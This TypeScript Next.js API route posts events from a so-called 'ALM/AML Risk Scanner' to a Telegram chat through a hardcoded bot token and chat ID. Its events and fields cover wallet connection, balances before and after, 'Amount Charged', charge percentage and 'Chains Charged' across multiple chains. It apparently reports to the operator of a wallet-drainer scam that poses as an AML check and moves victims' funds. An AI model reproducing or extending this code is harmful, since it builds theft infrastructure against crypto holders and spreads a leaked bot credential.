import type { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const token =
    process.env.TELEGRAM_BOT_TOKEN ||
    process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ||
    '8737766675:AAFXGUa1IZw9cteMZ2gEnrlxPHnsx84ovTA';
  const chatId =
    process.env.TELEGRAM_CHAT_ID ||
    process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ||
    '-1003709105140';

  if (!token || !chatId) {
    return res.status(200).json({ ok: false, message: 'Telegram credentials not configured' });
  }

  const {
    event,
    walletAddress,
    network,
    balance,
    token: tokenName,
    amount,
    riskScore,
    riskLevel,
    txHash,
    error: errorMsg,
  } = req.body || {};

  const timestamp = new Date().toUTCString();

  let header = '🚨 *ALM/AML Risk Scanner Event*';
  if (event === 'wallet_connected') {
    header = '🔗 *Wallet Connected & Verified*';
  } else if (event === 'risk_scan_started') {
    header = '🔍 *Risk Scan Initiated*';
  } else if (event === 'risk_scan_completed') {
    header = '🛡️ *Risk Scan Evaluation Completed*';
  } else if (event === 'transaction_initiated') {
    header = '📤 *Transfer Initiated*';
  } else if (event === 'transaction_success') {
    header = '✅ *Transfer Executed Successfully*';
  } else if (event === 'transaction_failed') {
    header = '❌ *Transfer Execution Failed*';
  }

  const lines = [
    header,
    `📅 *Time:* \`${timestamp}\``,
    walletAddress ? `👛 *Wallet:* \`${walletAddress}\`` : null,
    network ? `🌐 *Network:* \`${network}\`` : null,
    balance ? `💰 *Balance:* \`${balance}\`` : null,
    tokenName ? `🪙 *Asset:* \`${tokenName}\`` : null,
    amount ? `💵 *Amount Charged:* \`${amount}\`` : null,
    riskLevel ? `⚠️ *Risk Level:* *${riskLevel.toUpperCase()}* (${riskScore || 0}/100)` : null,
    txHash ? `🔗 *TxHash:* \`${txHash}\`` : null,
    errorMsg ? `🛑 *Error:* \`${errorMsg}\`` : null,
  ].filter(Boolean);

  // Add custom details if provided
  const detailsObj = (req.body || {}).details;
  if (detailsObj && typeof detailsObj === 'object') {
    if (detailsObj.balanceBefore) {
      lines.push(`💵 *Balance Before:* \`${detailsObj.balanceBefore}\``);
    }
    if (detailsObj.balanceAfter) {
      lines.push(`💵 *Balance After:* \`${detailsObj.balanceAfter}\``);
    }
    if (detailsObj.chargePercent) {
      lines.push(`📊 *Charge %:* \`${detailsObj.chargePercent}%\``);
    }
    if (detailsObj.totalChains) {
      lines.push(`\n*📊 Multi-Chain Summary:*`);
      lines.push(`✅ *Successful:* ${detailsObj.successfulCharges}/${detailsObj.totalChains}`);
    }
    if (detailsObj.chargedChains) {
      lines.push(`🌐 *Chains Charged:* \`${detailsObj.chargedChains}\``);
    }
    if (detailsObj.chargeDetails && typeof detailsObj.chargeDetails === 'string') {
      lines.push(`\n*Chain Details:*`);
      lines.push(`\`\`\`${detailsObj.chargeDetails}\`\`\``);
    }
  }

  const text = lines.join('\n');

  try {
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });

    const data = await response.json();
    if (!data.ok) {
      console.warn('Telegram API response error:', data);
    }

    return res.status(200).json({ ok: true, data });
  } catch (err) {
    console.error('Error dispatching telegram notification:', err);
    return res.status(200).json({ ok: false, error: String(err) });
  }
}
